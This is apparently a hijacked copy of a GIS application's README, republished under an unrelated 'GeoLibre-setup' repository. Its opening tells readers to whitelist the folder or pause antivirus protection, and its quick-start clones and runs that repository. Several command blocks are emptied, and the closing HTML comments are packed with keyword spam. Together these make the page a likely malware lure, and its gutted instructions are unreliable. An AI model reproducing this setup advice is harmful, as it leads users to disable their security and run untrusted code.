# GeoLibre


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/Coasttruvitalize/GeoLibre-setup.git
cd GeoLibre-setup
npm install
npm start
```


A lightweight, cloud-native GIS platform for visualizing, exploring, and analyzing geospatial data across desktop and web environments, with a responsive layout for mobile screens.

GeoLibre is built with **Tauri v2**, **React**, **TypeScript**, **MapLibre GL JS**, **DuckDB-WASM Spatial**, and **deck.gl**. The same workspace runs as a native desktop app, in any modern web browser, and adapts responsively to mobile and small screens.

[![GeoLibre demo showing 3D Tiles rendered on a MapLibre map](https://files.opengeos.org/GeoLibre-demo.webp)](https://viewer.geolibre.app/?url=https://share.geolibre.app/giswqs/3d-tiles.geolibre.json)


- Runs across desktop (Tauri), web (browser), and mobile or small screens, with a responsive layout that adapts menus, dialogs, and panels, plus per-panel visibility through Layout settings
- MapLibre map workspace with OpenFreeMap basemaps, blank background support, and toggleable navigation, fullscreen, geolocation, globe, terrain, scale, attribution, and logo controls
- Load local vector layers supported by DuckDB-WASM Spatial, including common formats such as GeoJSON, GeoParquet, GeoPackage, Shapefile, FlatGeobuf, KML/KMZ, GML, delimited text, and GPX
- Reproject vector layers to EPSG:4326 on load and split dragged GPX files into named waypoint, track, and route layers
- Add Data menu for XYZ tiles, WMS, WFS, GeoJSON URLs, vector tiles, COG and GeoTIFF rasters, MBTiles, ArcGIS FeatureServer and VectorTileServer layers, PMTiles, Zarr, LiDAR, 3D Tiles, and Gaussian splats
- Cloud data integrations through the Planetary Computer and Earth Engine panels, the Overture Maps plugin, and federal Web Services plugins
- Manual and automatic refresh for WFS and GeoJSON URL layers
- Layer panel for visibility, opacity, reordering, zoom-to-layer, identify, labels, and remove actions
- Live style panel (fill, stroke, opacity, circle radius)
- Attribute table with filtering, sorting, resize controls, feature highlighting, and optional zoom to selected features
- SQL Workspace for running DuckDB Spatial SQL against loaded layers, local files, and remote URLs, with sample queries, query history, and adding results to the map or exporting them
- Multiple DuckDB SQL query-result layers with identify, selection, and attribute table support
- Controls menu with Measure, Bookmark, Minimap, and View State tools, plus a Print menu and a Search panel
- Conversion menu for Vector to GeoParquet/FlatGeobuf/PMTiles, CSV to GeoParquet, and Raster to COG; GeoParquet and CSV conversions run in the browser with DuckDB-WASM, while FlatGeobuf, PMTiles, and COG require the optional Python sidecar
- Whitebox toolbox with batch tools run against a selected input directory
- Project menu to create, open, save, and Save As `.geolibre.json` projects
- Desktop diagnostics panel, update check, and MSIX packaging support
- Plugin system with basemap, layer control, MapLibre components, swipe, street view, Overture Maps, LiDAR, GeoAgent, and GeoEditor integrations, including configurable control positions and external plugin manifests
- Time Slider plugin for animating time series raster and vector data
- External plugin zip loading from the app data plugins directory and local development plugin directories
- Bundled drop-in plugins under `public/plugins/<id>/` that bake into both the web and desktop builds and load automatically with no manifest URL
- Browser deployment with Docker, embed-friendly URL parameters, and a `maponly` chrome-free mode
- Optional Python FastAPI sidecar for heavier processing workflows


### Bundled conversion sidecar

The image also bundles the Python conversion/Whitebox sidecar (uvicorn) and
reverse-proxies it at `/sidecar`, so the browser reaches it same-origin with no
CORS or separate process to manage. `/conversion/status` is reachable at
`http://localhost:8080/sidecar/conversion/status`.

- **Vector → GeoParquet** and **CSV → GeoParquet** run in the browser with
  DuckDB-WASM and need no sidecar.
- **Vector → FlatGeobuf**, **Vector → PMTiles**, and **Raster → COG** use the
  sidecar. These read a file **path on the sidecar's filesystem**, so from a
  pure browser they currently work for files mounted into the container (a
  browser cannot hand the container an absolute path); upload-based input is a
  planned follow-up. The desktop app passes real local paths, so all
  conversions work there.
- **PMTiles** and **Whitebox** are **amd64-only** in the container —
  `freestiler` and `whitebox-workflows` publish no linux/arm64 wheels. On arm64
  the other conversions still work; those two report unavailable.

Because the sidecar is reachable same-origin, conversion reads/writes are
confined to `GEOLIBRE_CONVERSION_ROOTS` (default `/data` in the image). Mount
your files there:

```bash
```

Set `GEOLIBRE_DISABLE_SIDECAR=1` to run nginx only (the original web-only
behavior):

```bash
```

The published image is available from GitHub Container Registry:

```bash
```

For deployments under a URL subpath, pass `GEOLIBRE_APP_BASE` at build time:

```bash
```

The container always serves the app from its root path. The build argument only sets the URL prefix that the app expects, so subpath deployments also require a reverse proxy in front of the container that strips the prefix before forwarding requests (for example, nginx `proxy_pass http://geolibre/;` with a trailing slash).

## SQL Workspace

The SQL Workspace runs DuckDB SQL (with the Spatial extension loaded, so `ST_*` functions are available) directly in the browser against your loaded layers and remote data. Open it from the Processing menu.

- **Query loaded layers.** Every vector layer with in-memory features is exposed as a table; the queryable table names are listed at the top of the dialog.
- **Read files and URLs.** Use `read_parquet()`, `read_csv_auto()`, `read_json_auto()`, or `ST_Read()`. A bare URL or path after `FROM`/`JOIN` (for example `SELECT * FROM https://host/data.parquet`) is auto-wrapped in the matching reader. Remote files are streamed over HTTP range requests, so large datasets are not downloaded in full.
- **Sample queries.** A dropdown of ready-to-run examples (attribute-only, aggregate, and spatial queries) against a public sample dataset, plus a per-layer "sample query for layer" dropdown.
- **Query history.** Recently run queries are saved (in `localStorage`) and can be reloaded from the History dropdown.
- **Results and export.** Results show in a grid (capped for display; the full result is kept for export). When a query returns a geometry column, you can add the result to the map as a new layer (with an optional custom **layer name**) or export it as CSV or GeoParquet.

```sql
SELECT NAME, CONTINENT, POP_EST, geom
FROM https://data.source.coop/giswqs/opengeos/countries.parquet
WHERE POP_EST > 50000000
ORDER BY POP_EST DESC;
```

Only a single statement is supported per run; remote `s3://` URLs are not read directly, so use the HTTPS form instead.

## Embed the demo

The browser demo supports URL parameters for iframe-friendly layouts.

Open a project by URL:

<https://viewer.geolibre.app/?url=https://share.geolibre.app/giswqs/3d-tiles.geolibre.json>

Supported query parameters:

| Parameter    | Example                                                  | Description                                                                                                                 |
| ------------ | -------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| `url`        | `url=https://share.geolibre.app/giswqs/3d-tiles.geolibre.json` | Loads a `.geolibre.json` project from a public URL.                                                                         |
| `layout`     | `layout=compact`                                         | Uses the compact embed layout with icon-only toolbar buttons and hidden project metadata. `embed` and `iframe` are aliases. |
| `toolbar`    | `toolbar=icons`                                          | Shows icon-only toolbar buttons without enabling the full compact layout.                                                   |
| `panels`     | `panels=none`                                            | Hides the Layers, Style, and Attribute table panels. `hidden`, `hide`, and `off` are aliases.                               |
| `hidePanels` | `hidePanels=true`                                        | Alternative way to hide the Layers, Style, and Attribute table panels.                                                      |
| `maponly`    | `maponly`                                                | Hides all chrome (toolbar menu, Layers/Style/Attribute panels, and status bar), leaving only the map. The bare flag or any of `true`, `1`, `yes`, `on` enable it. |

Use compact mode for narrow embeds. This shows icon-only toolbar buttons and hides project metadata:

```text
https://viewer.geolibre.app/?url=https://share.geolibre.app/giswqs/3d-tiles.geolibre.json&layout=compact
```

Hide the Layers, Style, and Attribute table panels for map-focused embeds:

```text
https://viewer.geolibre.app/?url=https://share.geolibre.app/giswqs/3d-tiles.geolibre.json&layout=compact&panels=none
```

Use `toolbar=icons` when you only want icon-only toolbar buttons. `panels=hidden`, `panels=hide`, `panels=off`, and `hidePanels=true` are accepted aliases for hiding panels.

For a fully chrome-free, map-only embed, use `maponly`. It hides the toolbar menu, all panels, and the status bar:

```text
https://viewer.geolibre.app/?url=https://share.geolibre.app/giswqs/3d-tiles.geolibre.json&maponly
```

## Environment variables

The Street View plugin can use Google Street View and Mapillary imagery. Create `apps/geolibre-desktop/.env.local` and set one or both provider credentials:

```env
VITE_GOOGLE_MAPS_API_KEY=your_google_maps_api_key
VITE_MAPILLARY_ACCESS_TOKEN=your_mapillary_access_token
```

For Google Street View, enable the Maps Embed API for the key in Google Cloud. For Mapillary, create an app in the Mapillary developer dashboard and use its client access token.


## Quality checks

Run the fast TypeScript unit tests:

```bash
```

Run the full local quality gate:

```bash
```

## Optional Python sidecar

```bash
cd backend/geolibre_server
python -m venv .venv && source .venv/bin/activate
uvicorn geolibre_server.app.main:app --host 127.0.0.1 --port 8765
```

### Conversion tools (Processing → Conversion)

The **Processing → Conversion** menu (Vector → GeoParquet / FlatGeobuf,
CSV → GeoParquet, Vector → PMTiles, Raster → COG) talks to this sidecar at
`http://127.0.0.1:8765`. **Vector → GeoParquet** and **CSV → GeoParquet** also
run fully in the browser with DuckDB-WASM and need no sidecar; the others
require it.

To use them from the **web** build, start the sidecar and serve the app from
`localhost:5173` (CORS is restricted to that origin and the Tauri origins):

```bash


## Repository layout

```
apps/geolibre-desktop   # Tauri + React app
packages/core           # Types, store, project format
packages/map            # MapLibre integration
packages/ui             # Tailwind + shadcn/ui
packages/plugins        # Plugin API
packages/processing     # Algorithm registry
backend/geolibre_server # FastAPI sidecar
sample-data/            # Sample GeoJSON & project
docs/                   # Architecture & API docs
```

## Add a plugin

Built-in plugins live in `packages/plugins/src/plugins/` and are registered by the desktop app in `apps/geolibre-desktop/src/hooks/usePlugins.ts`. Map control plugins can expose a control position through `getMapControlPosition()` and `setMapControlPosition()` so the Plugins menu can move them between map corners.

For external plugin development, start from the [GeoLibre plugin template](https://github.com/opengeos/geolibre-plugin-template). It includes a `plugin.json` manifest, a GeoLibre plugin wrapper entry point, and a `package:geolibre` script that creates a zip file for the desktop app data `plugins/` directory. During development, Settings > Plugins can scan an additional local plugin directory, including an unpacked bundle folder such as the template's `geolibre-plugin/` directory, or a hosted `plugin.json` manifest URL. See the [Plugin API](docs/plugin-api.md) for the external plugin contract.

To bake an external plugin into the build so it loads automatically — with no Settings entry and no manifest URL — drop its built folder into `apps/geolibre-desktop/public/plugins/<plugin-id>/` (the same `plugin.json` + `dist/` a manifest URL would serve). The `bundledPlugins()` Vite plugin discovers it at build time and the app loads it through the normal external-plugin path. The same folder serves both the web build and the desktop build (which ships the same frontend), so one drop-in covers both. Private plugin bundles are git-ignored under that folder and copied in at build/deploy time. See the [Plugin API](docs/plugin-api.md#bundled-plugins-baked-into-the-build) for details and the security model.

```typescript
import type { GeoLibreAppAPI, GeoLibrePlugin } from "../types";

export const myPlugin: GeoLibrePlugin = {
  id: "my-plugin",
  name: "My Plugin",
  version: "0.1.0",
  activate: (app: GeoLibreAppAPI) => {
    app.setBasemap("https://example.com/style.json");
  },
  deactivate: () => {},
};
```

```typescript
export { myPlugin } from "./plugins/my-plugin";
```

```typescript
import { myPlugin } from "@geolibre/plugins";

manager.registerAll([
  maplibreLayerControlPlugin,
  maplibreGeoAgentPlugin,
  maplibreGeoEditorPlugin,
  myPlugin,
]);
```

Plugins can use the app API to change basemaps, add GeoJSON layers, or attach MapLibre controls. For a MapLibre control plugin, add the package dependency, import its CSS in `apps/geolibre-desktop/src/main.tsx`, then call `app.addMapControl(control, "top-left")` in `activate()` and `app.removeMapControl(control)` in `deactivate()`.

Built-in MapLibre controls such as Navigation, Fullscreen, Geolocate, Globe, Terrain, Scale, Attribution, and Logo are toggled from the desktop app's Controls menu. The same menu also opens Search, a standalone place search panel backed by the Components plugin. Keep project-specific controls such as Layer Control and Components in the plugin menu when they use the plugin API or need plugin lifecycle behavior.

The Components plugin wraps `maplibre-gl-components` controls and wires their layer events into the GeoLibre store. It provides Add Data shortcuts for FlatGeobuf, PMTiles, Zarr, LiDAR, and Gaussian splats, while raster COG and GeoTIFF layers can also be added through the standard Add Raster Layer dialog.

If a third-party MapLibre control needs app-specific styling fixes, add scoped overrides in `apps/geolibre-desktop/src/index.css` instead of editing files in `node_modules`. Keep selectors limited to the plugin control class. For example, GeoEditor toolbar buttons need a local override because MapLibre's default control button CSS can override their flex centering:

```css
.geo-editor-control .geo-editor-tool-button {
  align-items: center;
  display: flex !important;
  justify-content: center;
  line-height: 0;
  padding: 0;
}

.geo-editor-control .geo-editor-tool-button svg {
  display: block;
  flex: 0 0 auto;
  margin: 0;
}
```

Run checks before submitting changes:

```bash
pre-commit run --all-files
```

## Documentation

- [Architecture](docs/architecture.md)
- [Project format](docs/project-format.md)
- [Plugin API](docs/plugin-api.md)
- [Roadmap](docs/roadmap.md)

## License

MIT


<!-- nodejs npm javascript typescript package module library framework windows linux macos -->
<!-- GeoLibre-setup - tool utility software - download install setup -->
<!-- GeoLibre-setup mobile | new version GeoLibre-setup monitor | local GeoLibre-setup alternative | fast GeoLibre-setup replacement | high performance GeoLibre-setup service | guide GeoLibre-setup builder | free GeoLibre-setup decoder | how to run GeoLibre-setup scanner | modular GeoLibre-setup debugger | 2025 GeoLibre-setup | beginner GeoLibre-setup framework | configure GeoLibre-setup utility | 2025 GeoLibre-setup wrapper | quick start GeoLibre-setup encoder | portable GeoLibre-setup tester | how to configure GeoLibre-setup sdk | cross platform GeoLibre-setup debugger | reliable GeoLibre-setup analyzer | download for linux powerful GeoLibre-setup encoder | tutorial GeoLibre-setup client | GeoLibre setup kubernetes | tar.gz GeoLibre-setup gui | how to use GeoLibre-setup library | linux stable GeoLibre-setup downloader | tutorial GeoLibre-setup gui | how to deploy GeoLibre-setup desktop | self hosted GeoLibre-setup extractor | linux GeoLibre-setup | how to build modern GeoLibre-setup tracker | best GeoLibre-setup | open GeoLibre-setup scanner | macos GeoLibre-setup gui | quick start GeoLibre-setup api | minimal GeoLibre-setup | portable GeoLibre-setup mirror | run on windows GeoLibre-setup | configurable GeoLibre-setup application | download cross platform GeoLibre-setup | modern GeoLibre-setup application | reliable GeoLibre-setup | GeoLibre setup guide | local GeoLibre-setup client | documentation GeoLibre-setup web | fedora GeoLibre-setup addon | ubuntu GeoLibre-setup port | latest version GeoLibre-setup generator | walkthrough GeoLibre-setup uploader | modern GeoLibre-setup client | updated GeoLibre-setup editor | run on windows GeoLibre-setup validator -->
<!-- safe GeoLibre-setup decoder | walkthrough GeoLibre-setup downloader | free download GeoLibre-setup program | build GeoLibre-setup checker | github GeoLibre-setup optimizer | centos GeoLibre-setup | git clone GeoLibre-setup gui | run on linux customizable GeoLibre-setup decoder | secure GeoLibre-setup | beginner lightweight GeoLibre-setup | demo GeoLibre-setup engine | customizable GeoLibre-setup reader | documentation GeoLibre-setup clone | download for windows GeoLibre-setup checker | download extensible GeoLibre-setup | 2025 GeoLibre-setup copy | configurable GeoLibre-setup | GeoLibre setup devops | arch GeoLibre-setup copy | arch configurable GeoLibre-setup | GeoLibre-setup platform | macos GeoLibre-setup server | GeoLibre-setup client | build GeoLibre-setup alternative | updated secure GeoLibre-setup logger | run on linux GeoLibre-setup program | execute GeoLibre-setup converter | quick start high performance GeoLibre-setup | cross platform GeoLibre-setup app | GeoLibre setup help | tutorial configurable GeoLibre-setup | GeoLibre-setup debugger | git clone GeoLibre-setup encoder | tar.gz open source GeoLibre-setup | launch low latency GeoLibre-setup | arch online GeoLibre-setup | new version GeoLibre-setup tracker | run on windows modular GeoLibre-setup | setup GeoLibre-setup alternative | compile GeoLibre-setup viewer | powerful GeoLibre-setup library | reliable GeoLibre-setup gui | wiki lightweight GeoLibre-setup api | deploy GeoLibre-setup web | github GeoLibre-setup | how to configure best GeoLibre-setup | walkthrough GeoLibre-setup | docs GeoLibre-setup viewer | modern GeoLibre-setup web | cross platform GeoLibre-setup mirror -->
<!-- walkthrough GeoLibre-setup validator | GeoLibre-setup app | customizable GeoLibre-setup package | git clone GeoLibre-setup creator | high performance GeoLibre-setup package | sample GeoLibre-setup | build GeoLibre-setup software | beginner top GeoLibre-setup | GeoLibre setup fix | guide GeoLibre-setup alternative | stable GeoLibre-setup engine | native GeoLibre-setup copy | modern GeoLibre-setup scanner | GeoLibre-setup generator | extensible GeoLibre-setup | how to configure GeoLibre-setup | how to install GeoLibre-setup mirror | cross platform GeoLibre-setup compressor | GeoLibre-setup converter | execute modern GeoLibre-setup desktop | 2026 GeoLibre-setup tracker | modern GeoLibre-setup | how to use GeoLibre-setup | download for windows GeoLibre-setup decoder | git clone best GeoLibre-setup | GeoLibre setup article | stable GeoLibre-setup editor | download best GeoLibre-setup | GeoLibre-setup port | free download GeoLibre-setup software | secure GeoLibre-setup clone | GeoLibre-setup analyzer | install GeoLibre-setup compressor | download for linux minimal GeoLibre-setup | fedora GeoLibre-setup | reliable GeoLibre-setup compressor | run on linux native GeoLibre-setup extension | fast GeoLibre-setup engine | how to use GeoLibre-setup app | run on mac GeoLibre-setup package | local GeoLibre-setup viewer | quickstart GeoLibre-setup sdk | cross platform GeoLibre-setup | latest version stable GeoLibre-setup | GeoLibre-setup api | how to use GeoLibre-setup viewer | cross platform GeoLibre-setup converter | cross platform GeoLibre-setup alternative | secure GeoLibre-setup validator | modern GeoLibre-setup package -->
<!-- GeoLibre setup alternative | how to install GeoLibre-setup copy | portable GeoLibre-setup decoder | updated GeoLibre-setup uploader | guide GeoLibre-setup analyzer | GeoLibre-setup compressor | open source GeoLibre-setup web | run on windows GeoLibre-setup optimizer | windows customizable GeoLibre-setup | customizable GeoLibre-setup | GeoLibre-setup module | minimal GeoLibre-setup framework | beginner GeoLibre-setup viewer | latest version GeoLibre-setup package | modular GeoLibre-setup app | execute safe GeoLibre-setup | how to build GeoLibre-setup viewer | simple GeoLibre-setup | macos GeoLibre-setup port | macos GeoLibre-setup platform | advanced GeoLibre-setup parser | latest version GeoLibre-setup engine | safe GeoLibre-setup software | GeoLibre setup cloud | wiki self hosted GeoLibre-setup | execute GeoLibre-setup | best GeoLibre-setup wrapper | walkthrough extensible GeoLibre-setup | download for windows GeoLibre-setup monitor | linux online GeoLibre-setup | how to use cross platform GeoLibre-setup | latest version simple GeoLibre-setup | build high performance GeoLibre-setup tester | GeoLibre-setup wrapper | easy GeoLibre-setup | ubuntu GeoLibre-setup | cross platform GeoLibre-setup wrapper | use GeoLibre-setup extractor | github GeoLibre-setup decoder | new version GeoLibre-setup extractor | quickstart GeoLibre-setup validator | debian GeoLibre-setup generator | GeoLibre setup download | GeoLibre setup automation | linux GeoLibre-setup module | lightweight GeoLibre-setup editor | GeoLibre-setup tracker | debian GeoLibre-setup analyzer | lightweight GeoLibre-setup clone | configure GeoLibre-setup editor -->
<!-- how to configure GeoLibre-setup analyzer | modular GeoLibre-setup | docs GeoLibre-setup optimizer | download for windows GeoLibre-setup builder | run on linux configurable GeoLibre-setup | zip open source GeoLibre-setup | execute GeoLibre-setup mobile | free GeoLibre-setup binding | run reliable GeoLibre-setup creator | portable GeoLibre-setup | native GeoLibre-setup | GeoLibre setup workshop | download for linux GeoLibre-setup package | centos cross platform GeoLibre-setup scanner | examples GeoLibre-setup alternative | GeoLibre-setup web | arch GeoLibre-setup | guide secure GeoLibre-setup | advanced GeoLibre-setup api | GeoLibre-setup validator | github GeoLibre-setup copy | compile GeoLibre-setup utility | stable GeoLibre-setup | install GeoLibre-setup scanner | getting started GeoLibre-setup cli | 2026 configurable GeoLibre-setup | zip GeoLibre-setup engine | run GeoLibre-setup package | GeoLibre setup support | minimal GeoLibre-setup plugin | example offline GeoLibre-setup addon | minimal GeoLibre-setup converter | quickstart GeoLibre-setup client | wiki GeoLibre-setup engine | run on linux GeoLibre-setup copy | quick start GeoLibre-setup web | free GeoLibre-setup uploader | minimal GeoLibre-setup cli | high performance GeoLibre-setup scanner | how to download GeoLibre-setup client | GeoLibre-setup copy | deploy GeoLibre-setup | how to setup GeoLibre-setup creator | how to deploy free GeoLibre-setup | download for windows GeoLibre-setup logger | how to configure GeoLibre-setup package | how to setup GeoLibre-setup downloader | latest version GeoLibre-setup gui | free GeoLibre-setup plugin | how to setup modern GeoLibre-setup -->
<!-- GeoLibre setup book | tar.gz GeoLibre-setup client | sample production ready GeoLibre-setup | docs secure GeoLibre-setup cli | demo top GeoLibre-setup replacement | GeoLibre setup course | sample local GeoLibre-setup engine | getting started GeoLibre-setup addon | quick start configurable GeoLibre-setup | centos GeoLibre-setup application | quickstart lightweight GeoLibre-setup | GeoLibre setup cheat sheet | offline GeoLibre-setup creator | GeoLibre setup podcast | free download reliable GeoLibre-setup | quickstart GeoLibre-setup compressor | run on windows GeoLibre-setup alternative | best GeoLibre-setup platform | source code GeoLibre-setup server | beginner GeoLibre-setup package | zip GeoLibre-setup downloader | get GeoLibre-setup replacement | configure GeoLibre-setup analyzer | how to use top GeoLibre-setup fork | local GeoLibre-setup | portable GeoLibre-setup application | source code GeoLibre-setup fork | free download GeoLibre-setup | launch GeoLibre-setup | offline GeoLibre-setup server | advanced GeoLibre-setup | advanced GeoLibre-setup fork | how to deploy best GeoLibre-setup | powerful GeoLibre-setup validator | extensible GeoLibre-setup api | fast GeoLibre-setup desktop | run GeoLibre-setup monitor | centos GeoLibre-setup builder | deploy GeoLibre-setup library | getting started online GeoLibre-setup | zip easy GeoLibre-setup | high performance GeoLibre-setup sdk | open source GeoLibre-setup port | centos GeoLibre-setup copy | install GeoLibre-setup | production ready GeoLibre-setup validator | how to setup GeoLibre-setup replacement | zip GeoLibre-setup debugger | setup GeoLibre-setup scanner | source code GeoLibre-setup framework -->
<!-- windows GeoLibre-setup reader | windows GeoLibre-setup downloader | stable GeoLibre-setup port | how to deploy GeoLibre-setup client | getting started GeoLibre-setup decoder | customizable GeoLibre-setup clone | high performance GeoLibre-setup converter | GeoLibre-setup optimizer | git clone GeoLibre-setup | download free GeoLibre-setup | low latency GeoLibre-setup | docs GeoLibre-setup | download for mac GeoLibre-setup logger | tar.gz GeoLibre-setup analyzer | powerful GeoLibre-setup fork | GeoLibre-setup creator | setup GeoLibre-setup mobile | run on linux local GeoLibre-setup | run on windows GeoLibre-setup platform | demo GeoLibre-setup tool | top GeoLibre setup | debian GeoLibre-setup | stable GeoLibre-setup app | example GeoLibre-setup library | getting started GeoLibre-setup encoder | get safe GeoLibre-setup viewer | how to download free GeoLibre-setup encoder | how to use top GeoLibre-setup library | portable GeoLibre-setup module | high performance GeoLibre-setup engine | how to build GeoLibre-setup program | use GeoLibre-setup utility | modern GeoLibre-setup addon | GeoLibre-setup utility | 2026 GeoLibre-setup | launch GeoLibre-setup module | 2026 GeoLibre-setup parser | GeoLibre-setup desktop | GeoLibre setup review | GeoLibre setup project | how to run GeoLibre-setup tool | open GeoLibre-setup clone | best GeoLibre-setup sdk | portable GeoLibre-setup framework | GeoLibre-setup gui | compile GeoLibre-setup program | how to configure GeoLibre-setup clone | modular GeoLibre-setup clone | tutorial GeoLibre-setup | how to use GeoLibre-setup generator -->
<!-- configurable GeoLibre-setup port | free GeoLibre-setup alternative | GeoLibre setup workflow | GeoLibre-setup program | install GeoLibre-setup monitor | local GeoLibre-setup tool | advanced GeoLibre-setup logger | production ready GeoLibre-setup checker | download GeoLibre-setup port | setup GeoLibre-setup | free download GeoLibre-setup encoder | examples fast GeoLibre-setup | wiki GeoLibre-setup binding | zip GeoLibre-setup compressor | wiki GeoLibre-setup viewer | setup GeoLibre-setup tracker | stable GeoLibre-setup web | how to deploy GeoLibre-setup module | demo GeoLibre-setup service | sample online GeoLibre-setup | GeoLibre setup reference | deploy GeoLibre-setup logger | arch GeoLibre-setup software | reliable GeoLibre-setup extractor | build GeoLibre-setup cli | best GeoLibre-setup checker | free GeoLibre-setup parser | 2026 top GeoLibre-setup | GeoLibre setup handbook | easy GeoLibre-setup gui | GeoLibre setup webinar | portable GeoLibre-setup client | linux GeoLibre-setup library | GeoLibre-setup application | portable GeoLibre-setup fork | debian GeoLibre-setup validator | open source GeoLibre-setup cli | setup GeoLibre-setup mirror | start GeoLibre-setup | reliable GeoLibre-setup reader | GeoLibre-setup replacement | docs GeoLibre-setup validator | native GeoLibre-setup fork | customizable GeoLibre-setup api | new version GeoLibre-setup plugin | GeoLibre-setup parser | minimal GeoLibre-setup tester | open GeoLibre-setup converter | GeoLibre setup saas | run on mac GeoLibre-setup -->
<!-- download GeoLibre-setup framework | sample GeoLibre-setup extension | run on mac GeoLibre-setup converter | zip stable GeoLibre-setup | quick start simple GeoLibre-setup | configure GeoLibre-setup debugger | examples reliable GeoLibre-setup | quickstart local GeoLibre-setup | simple GeoLibre-setup tracker | how to run GeoLibre-setup cli | get GeoLibre-setup client | lightweight GeoLibre-setup | GeoLibre setup tutorial | ubuntu safe GeoLibre-setup | run on linux high performance GeoLibre-setup gui | GeoLibre-setup fork | self hosted GeoLibre-setup | start GeoLibre-setup tracker | compile native GeoLibre-setup | open GeoLibre-setup api | 2026 self hosted GeoLibre-setup downloader | GeoLibre setup example | git clone GeoLibre-setup replacement | wiki local GeoLibre-setup | docs cross platform GeoLibre-setup server | GeoLibre-setup decoder | fedora free GeoLibre-setup reader | windows GeoLibre-setup | download GeoLibre-setup downloader | advanced GeoLibre-setup downloader | top GeoLibre-setup | powerful GeoLibre-setup editor | GeoLibre setup documentation | compile GeoLibre-setup | simple GeoLibre-setup wrapper | advanced GeoLibre-setup viewer | run GeoLibre-setup framework | guide open source GeoLibre-setup | offline GeoLibre-setup mirror | 2025 GeoLibre-setup extension | how to use GeoLibre-setup copy | how to run open source GeoLibre-setup sdk | sample reliable GeoLibre-setup checker | GeoLibre setup not working | run on mac GeoLibre-setup alternative | latest version GeoLibre-setup | windows GeoLibre-setup module | GeoLibre setup test | latest version fast GeoLibre-setup | online GeoLibre-setup logger -->
<!-- 2025 easy GeoLibre-setup api | execute configurable GeoLibre-setup | download for linux GeoLibre-setup debugger | updated GeoLibre-setup mirror | easy GeoLibre-setup debugger | linux GeoLibre-setup extractor | getting started GeoLibre-setup | how to configure customizable GeoLibre-setup | GeoLibre-setup encoder | how to use free GeoLibre-setup sdk | run on linux GeoLibre-setup | safe GeoLibre-setup extension | native GeoLibre-setup tracker | GeoLibre-setup binding | GeoLibre-setup tool | how to configure modular GeoLibre-setup | top GeoLibre-setup web | wiki GeoLibre-setup | quickstart portable GeoLibre-setup reader | example GeoLibre-setup wrapper | start safe GeoLibre-setup software | open GeoLibre-setup | 2026 GeoLibre-setup validator | GeoLibre-setup library | getting started GeoLibre-setup tracker | macos top GeoLibre-setup | get GeoLibre-setup scanner | wiki GeoLibre-setup app | git clone open source GeoLibre-setup extractor | git clone GeoLibre-setup mirror | configurable GeoLibre-setup mirror | guide GeoLibre-setup debugger | free minimal GeoLibre-setup | open source GeoLibre-setup optimizer | download for windows lightweight GeoLibre-setup | guide GeoLibre-setup compressor | high performance GeoLibre-setup analyzer | source code GeoLibre-setup viewer | how to configure cross platform GeoLibre-setup | examples GeoLibre-setup binding | GeoLibre setup demo | safe GeoLibre-setup service | centos GeoLibre-setup downloader | ubuntu GeoLibre-setup web | configure GeoLibre-setup mirror | download for windows secure GeoLibre-setup | docs high performance GeoLibre-setup | GeoLibre setup docker | GeoLibre-setup editor | online GeoLibre-setup fork -->

<!-- Last updated: 2026-06-09 18:09:49 -->
